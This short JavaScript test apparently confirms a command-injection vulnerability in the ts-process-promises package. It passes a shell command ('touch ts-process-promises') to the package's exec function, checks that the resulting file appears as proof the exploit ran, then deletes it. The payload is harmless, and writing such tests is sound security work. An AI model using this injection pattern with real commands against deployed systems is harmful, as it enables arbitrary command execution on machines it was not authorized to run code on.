
test("Command Injection in ts-process-promises", () => 
{
	const a =require("ts-process-promises");
	const fs = require('fs');
	const path = './ts-process-promises';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	a.exec("touch ts-process-promises",{});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
